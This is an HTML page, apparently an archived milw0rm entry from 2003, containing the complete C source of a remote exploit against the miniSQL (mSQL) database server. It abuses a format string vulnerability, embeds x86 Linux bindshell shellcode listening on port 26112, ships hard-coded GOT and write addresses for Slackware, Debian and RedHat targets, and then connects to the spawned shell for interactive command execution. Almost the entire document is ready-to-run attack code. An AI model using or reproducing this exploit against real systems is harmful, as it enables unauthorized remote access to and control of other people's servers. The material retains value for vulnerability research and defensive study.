<html><head><title>miniSQL (mSQL) 1.3 Remote GID Root Exploit</title></head><pre>/*           _ ________            _____                        ______
    __ ___ ____       /____.------`    /_______.------.___.----`  ___/____ _______
         _/    \ _   /\   __.  __//   ___/_    ___.  /_\    /_    |     _/
   ___ ._\    . \\  /__  _____/ _    /     \_  |    /__      |   _| slc | _____ _
      - -------\______||--._____\---._______//-|__    //-.___|----._____||
					       / \   /
                                                   \/
[*] mSQL &lt; remote gid root exploit    by lucipher &amp; The Itch (netric)
   ------------------------------------------------------------------------------

[*]  Exploits a format string hole in mSQL.

[*] Some functions are taken from mSQL's sourcecode

    Copyright (c) 2003 Netric Security and lucipher
    All rights reserved.

    THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR IMPLIED
    WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
    MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
*/

#include &lt;stdio.h&gt;	/* required by fatal() */
#include &lt;stdlib.h&gt;
#include &lt;stdarg.h&gt;	/* required by fatal() */
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;	/* required by errno */
#include &lt;getopt.h&gt;	/* required by getopt() */
#include &lt;signal.h&gt;

#define PKT_LEN		(128*1024)
#define ERR_BUF_LEN     200
#define resetError()    bzero(msqlErrMsg,sizeof(msqlErrMsg))
#define chopError()     { char *cp; cp = msqlErrMsg+strlen(msqlErrMsg) -1; \
                                if (*cp == '\n') *cp = 0;}

#define NET_READ(fd,b,l)	read(fd,b,l)
#define NET_WRITE(fd,b,l)	write(fd,b,l)

#define SERVER_GONE_ERROR	&quot;server has gone...\n&quot;
#define UNKNOWN_ERROR		&quot;foo!&quot;  

static char msqlErrMsg[200];
static u_char packetBuf[PKT_LEN + 4];
static int readTimeout;
u_char *packet = NULL;

int netReadPacket(int fd);
int netWritePacket(int fd);

/* bindshell shellcode */
char linux_code[78] = /* binds on port 26112 */
        &quot;\x31\xdb\xf7\xe3\x53\x43\x53&quot;
        &quot;\x6a\x02\x89\xe1\xb0\x66\x52&quot;
        &quot;\x50\xcd\x80\x43\x66\x53\x89&quot;
        &quot;\xe1\x6a\x10\x51\x50\x89\xe1&quot;
        &quot;\x52\x50\xb0\x66\xcd\x80\x89&quot;
        &quot;\xe1\xb3\x04\xb0\x66\xcd\x80&quot;
        &quot;\x43\xb0\x66\xcd\x80\x89\xd9&quot;
        &quot;\x93\xb0\x3f\xcd\x80\x49\x79&quot;
        &quot;\xf9\x52\x68\x6e\x2f\x73\x68&quot;
        &quot;\x68\x2f\x2f\x62\x69\x89\xe3&quot;
        &quot;\x52\x53\x89\xe1\xb0\x0b\xcd&quot;
        &quot;\x80&quot;;

static void intToBuf(cp, val)
u_char *cp;
int val;
{
        *cp++ = (unsigned int) (val &amp; 0x000000ff);
        *cp++ = (unsigned int) (val &amp; 0x0000ff00) &gt;&gt; 8;
        *cp++ = (unsigned int) (val &amp; 0x00ff0000) &gt;&gt; 16;
        *cp++ = (unsigned int) (val &amp; 0xff000000) &gt;&gt; 24;
}

static int bufToInt(cp)
u_char *cp;
{
        int val;

        val = 0;
        val = *cp++;
        val += ((int) *cp++) &lt;&lt; 8;
        val += ((int) *cp++) &lt;&lt; 16;
        val += ((int) *cp++) &lt;&lt; 24;
        return (val);
}

int netWritePacket(fd)
int fd;
{
        int len, offset, remain, numBytes;

        len = strlen((char *) packet);
        intToBuf(packetBuf, len);
        offset = 0;
        remain = len + 4;
        while (remain &gt; 0) {
                numBytes = NET_WRITE(fd, packetBuf + offset, remain);
                if (numBytes == -1) {
                        return (-1);
                }
                offset += numBytes;
                remain -= numBytes;
        }
        return (0);
}

int netReadPacket(fd)
int fd;
{
        u_char buf[4];
        int len, remain, offset, numBytes;

        remain = 4;
        offset = 0;
        numBytes = 0;
        readTimeout = 0;
        while (remain &gt; 0) {
                /*
                 ** We can't just set an alarm here as on lots of boxes
                 ** both read and recv are non-interuptable.  So, we
                 ** wait till there something to read before we start
                 ** reading in the server (not the client)
                 */
                if (!readTimeout) {
                        numBytes = NET_READ(fd, buf + offset, remain);
                        if (numBytes &lt; 0 &amp;&amp; errno != EINTR) {
                                fprintf(stderr,
                                        &quot;Socket read on %d for length failed : &quot;,
                                        fd);

                                perror(&quot;&quot;);
                        }
                        if (numBytes &lt;= 0)
                                return (-1);
                }
                if (readTimeout)
                        break;
                remain -= numBytes;
                offset += numBytes;

        }
        len = bufToInt(buf);
        if (len &gt; PKT_LEN) {
                fprintf(stderr, &quot;Packet too large (%d)\n&quot;, len);
                return (-1);
        }
        if (len &lt; 0) {
                fprintf(stderr, &quot;Malformed packet\n&quot;);
                return (-1);
        }
        remain = len;
        offset = 0;
        while (remain &gt; 0) {
                numBytes = NET_READ(fd, packet + offset, remain);

                if (numBytes &lt;= 0) {
                        return (-1);
                }
                remain -= numBytes;
                offset += numBytes;
        }
        *(packet + len) = 0;
        return (len);
}

int msqlSelectDB(int sock, char *db)
{
        memset(msqlErrMsg, 0x0, sizeof(msqlErrMsg));

        packet = packetBuf+4;

        snprintf(packet, PKT_LEN, &quot;%d:%s\n&quot;, 2, db);
        netWritePacket(sock);
        if (netReadPacket(sock) &lt;= 0) {
                strcpy(msqlErrMsg, SERVER_GONE_ERROR);
                return (-1);
        }
        if (atoi(packet) == -1) {
                char *cp;

                cp = (char *) index(packet, ':');
                if (cp) {
                        strcpy(msqlErrMsg, cp + 1);
                        chopError();
                } else {
                        strcpy(msqlErrMsg, UNKNOWN_ERROR);
                }
                return (-1);
        }

        return (0);
}

struct target {
	char *name;			/* target description */
	unsigned long writeaddr;	/* mSQL's errMsg + 18 + 8 address */
	unsigned long smashaddr;	/* strcpy's GOT address */
	unsigned long pops;		/* number of stack pops */
};

/* high and low words indexers */
enum { hi, lo };

/* default values. */
struct target targets[] = {
	/* name                         write      smash       pops */
	{ &quot;SlackWare 8.1 - mSQL 3.0p1&quot;, 0x80a169a, 0x080751ec, 113 },
	{ &quot;Debian 3.0 - mSQL 3.0p1&quot;, 134879034, 0x08075224, 113 },
	{ &quot;RedHat 8.0 - mSQL 3.0p1&quot;, 0x804b778, 0x08074c1c, 115 },
	{ &quot;RedHat 8.0 (II) - mSQL 3.0p1&quot;, 0x804b778, 0x08074c1c, 116 },
	{ NULL, 0x0, 0x0, 0 }
};

void fatal(char *fmt, ...)
{
        char buffer[1024];
        va_list ap;

        va_start(ap, fmt);
        vsnprintf(buffer, sizeof (buffer) - 1, fmt, ap);
        va_end(ap);

        fprintf(stderr, &quot;%s&quot;, buffer);
        exit(1);
}

/* resolve a given hostname */
unsigned long tcp_resolv(char *hostname)
{
        struct hostent *he;
        unsigned long addr;
        int n;

        he = gethostbyname(hostname);
        if (he == NULL) {
                n = inet_aton(hostname, (struct in_addr *) addr);
                if (n &lt; 0)
                        fatal(&quot;inet_aton: %s\n&quot;, strerror(errno));

                return addr;
        }

        return *(unsigned long *) he-&gt;h_addr;
}

/* routine to open a tcp/ip connection */
int tcp_connect(char *hostname, int port)
{
        struct sockaddr_in sin;
        int fd, n;

        sin.sin_addr.s_addr = tcp_resolv(hostname);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(port);

        fd = socket(AF_INET, SOCK_STREAM, 6);
        if (fd &lt; 0)
                return -1;

        n = connect(fd, (struct sockaddr *) &amp;sin, sizeof (sin));
        if (n &lt; 0)
                return -1;

        return fd;
}

int msql_login(char *hostname, unsigned short int port)
{
	char buffer[300], *p;
	int fd, n, opt;

	fd = tcp_connect(hostname, port);
	if (fd &lt; 0)
		fatal(&quot;[-] couldn't connect to host %s:%u\n&quot;, hostname, port);

	setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, (char *) &amp;opt, 4);

	memset(&amp;buffer, 0x0, sizeof(buffer));
	n = read(fd, &amp;buffer, sizeof(buffer) - 1);
	if (n &lt; 0)
		fatal(&quot;[-] could not read socket: %s\n&quot;, strerror(errno));

	p = (char *)&amp;buffer + 4;
	if (atoi(p) == -1)
		fatal(&quot;[-] bad handshake received.\n&quot;);
	p++;
	if (*p != ':') p++;
	p++;
	if (*p &gt;= '1' &amp;&amp; *p &lt;= '3') {
		/* send buffer size within packet. */
		buffer[0] = (unsigned int) (5UL &amp; 0x000000ff);
		buffer[1] = (unsigned int) (5UL &amp; 0x0000ff00) &gt;&gt; 8;
		buffer[2] = (unsigned int) (5UL &amp; 0x00ff0000) &gt;&gt; 16;
		buffer[3] = (unsigned int) (5UL &amp; 0xff000000) &gt;&gt; 24;
		/* sorta like our login. */
		buffer[4] = 'r';
		buffer[5] = 'o';
		buffer[6] = 'o';
		buffer[7] = 't';
		buffer[8] = '\n';
		buffer[9] = '\0';

		write(fd, buffer, 9);	
	}

	n = read(fd, buffer, sizeof(buffer) - 1);
	if (n &lt; 0)
		fatal(&quot;[-] client failed in handshake.\n&quot;);

	printf(&quot;[+] connected to %s -&gt; %u\n&quot;, hostname, port);
	return fd;
}

void msql_selectdb(int fd, char *database)
{
	unsigned char buffer[300];
	unsigned int len;

	len = 117;
	buffer[0] = (unsigned char)(len &amp; 0x000000ff);
	buffer[1] = (unsigned char)(len &amp; 0x0000ff00) &gt;&gt; 8;
	buffer[2] = (unsigned char)(len &amp; 0x00ff0000) &gt;&gt; 16;
	buffer[3] = (unsigned char)(len &amp; 0xff000000) &gt;&gt; 24;

	snprintf(&amp;buffer[4], sizeof(buffer) - 1, &quot;2:%s\n&quot;, database);
	len = write(fd, &amp;buffer[0], len);

}

void shell(int fd)
{
	char buf[512];
	fd_set rfds;
	int l;

	write(fd, &quot;id ; uname -a\n&quot;, 14);
	while (1) {
		FD_SET(0, &amp;rfds);
		FD_SET(fd, &amp;rfds);
		select(fd + 1, &amp;rfds, NULL, NULL, NULL);

		if (FD_ISSET(0, &amp;rfds)) {
			l = read(0, buf, sizeof (buf));
			if (l &lt;= 0) {
				perror(&quot;read user&quot;);
				exit(EXIT_FAILURE);
			}
			write(fd, buf, l);
		}

		if (FD_ISSET(fd, &amp;rfds)) {
			l = read(fd, buf, sizeof (buf));
			if (l == 0) {
				fatal(&quot;connection closed by foreign host.\n&quot;);
			} else if (l &lt; 0) {
				perror(&quot;read remote&quot;);
				exit (EXIT_FAILURE);
			}
			write(1, buf, l);
		}

	}
}

void usage(void)
{
	fprintf(stderr, &quot;mSQLexploit\n\n&quot;);
	fprintf(stderr, &quot;  -l\t\tlist available targets.\n&quot;);
	fprintf(stderr, &quot;  -t target\ttarget selection.\n&quot;);
	fprintf(stderr, &quot; *** MANUAL ATTACK ***\n&quot;);
	fprintf(stderr, &quot;  -s [addr]\tsmash address.\n&quot;);
	fprintf(stderr, &quot;  -w [addr]\twrite address.\n&quot;);
	fprintf(stderr, &quot;  -p [num]\tnumber of pops.\n&quot;);
	exit(1);
}

int main(int argc, char **argv)
{
	struct target manual;
	struct target *target = NULL;
	unsigned short port = 0, addr[2];
	unsigned char split[4];
	char *hostname, buffer[200];
	int fd, opt;

	if (argc &lt;= 1)
		usage();

	memset(&amp;manual, 0x00, sizeof(struct target));
	while ((opt = getopt(argc, argv, &quot;lht:s:w:p:&quot;)) != EOF) {
		switch (opt) {
		case 't': /* pre-written target selection */
			target = &amp;targets[atoi(optarg)];
			break;
		case 'l': 
			{
			int i;
			/* iterate through the list of targets and display. */
			for (i = 0; targets[i].name; i++)
				printf(&quot;[%d] %s\n&quot;, i, targets[i].name);

			exit(1);
			}
		case 'h':
			/* print exploit usage information */
			usage();
			break; /* never reached */
		case 's':
			if (target == NULL)
				target = &amp;manual;

			target-&gt;name = &quot;Manual Target&quot;;
			target-&gt;smashaddr = strtoul(optarg, NULL, 16);
			break;
		case 'w':
			if (target == NULL)
				target = &amp;manual;

			target-&gt;name = &quot;Manual Target&quot;;
			target-&gt;writeaddr = strtoul(optarg, NULL, 16) + 0x1a;
			break;
		case 'p':
			if (target == NULL)
				target = &amp;manual;
			target-&gt;name = &quot;Manual Target&quot;;
			target-&gt;pops = atoi(optarg);
		}
	}

	argc -= optind;
	argv += optind;

	if (argc &lt;= 0) {
		fatal(&quot;choose a hostname and optionally a port\n&quot;);
	} else if (argc == 1) {
		hostname = argv[0];
	} else {
		hostname = argv[0];
		port = atoi(argv[1]) &amp; 0xff;
	}
	if (target != NULL) {
		if (!strncmp(target-&gt;name, &quot;Manual&quot;, 6))
			if (!target-&gt;smashaddr || !target-&gt;writeaddr || 
			    !target-&gt;pops)
				fatal(&quot;exploit requires pop count and &quot;
				&quot;smash, write addresses: use -p and -w and -s &quot;
				&quot;to set them\n&quot;);
	} else {
		target = &amp;target[0];
	}

	printf(&quot;[+] attacking %s -&gt; %u\n&quot;, hostname, (port) ? port : 1114);

	fd = msql_login(hostname, (port) ? port : 1114);

	printf(&quot;[+] name %s\n&quot;, target-&gt;name);
	printf(&quot;[+] smash %08lx\n&quot;, target-&gt;smashaddr);
	printf(&quot;[+] write %08lx\n&quot;, target-&gt;writeaddr);
	printf(&quot;[+] Now building string...\n&quot;);

	memset(&amp;buffer, 0x0, sizeof(buffer));

	addr[lo] = (target-&gt;writeaddr &amp; 0x0000ffff);
	addr[hi] = (target-&gt;writeaddr &amp; 0xffff0000) &gt;&gt; 16;

	/* split the address */
	split[0] = (target-&gt;smashaddr &amp; 0xff000000) &gt;&gt; 24;
	split[1] = (target-&gt;smashaddr &amp; 0x00ff0000) &gt;&gt; 16;
	split[2] = (target-&gt;smashaddr &amp; 0x0000ff00) &gt;&gt; 8;
	split[3] = (target-&gt;smashaddr &amp; 0x000000ff);

	/* build the format string */
	if (addr[hi] &lt; addr[lo])
		snprintf(buffer, sizeof(buffer),
				&quot;%c%c%c%c&quot;
				&quot;%c%c%c%c&quot;

				&quot;%s&quot;

				&quot;%%.%du%%%ld$hn&quot;
				&quot;%%.%du%%%ld$hn&quot;,
			
				split[3] + 2, split[2], split[1], split[0],
				split[3], split[2], split[1], split[0],
				linux_code,
				addr[hi] - 0x68, target-&gt;pops, 
				addr[lo] - addr[hi], target-&gt;pops + 1);
	else 
		snprintf(buffer, sizeof(buffer),
                                &quot;%c%c%c%c&quot;
                                &quot;%c%c%c%c&quot;

                                &quot;%s&quot;

                                &quot;%%.%du%%%ld$hn&quot;
                                &quot;%%.%du%%%ld$hn&quot;,

                                split[3] + 2, split[2], split[1], split[0],
                                split[3], split[2], split[1], split[0],
                                linux_code,
                                addr[lo] - 0x68, target-&gt;pops,
                                addr[hi] - addr[lo], target-&gt;pops + 1);
	
	printf(&quot;[+] Trying to exploit...\n&quot;);
	msqlSelectDB(fd, buffer);
	switch (opt = fork()) {
	case 0: 
		msqlSelectDB(fd, buffer);
		exit(1);
	case -1:
		fatal(&quot;[-] failed fork()!\n&quot;);
	default:
		break;
	}

	printf(&quot;[+] sleeping...\n&quot;);
	sleep(1);
	opt = tcp_connect(hostname, 26112);
	if (opt &lt; 0)
		fatal(&quot;[-] failed! couldn't connect to bindshell!\n&quot;);

	printf(&quot;[+] shell!\n&quot;);
	shell(opt);
	
	return 0;
}


// milw0rm.com [2003-07-25]</pre></html>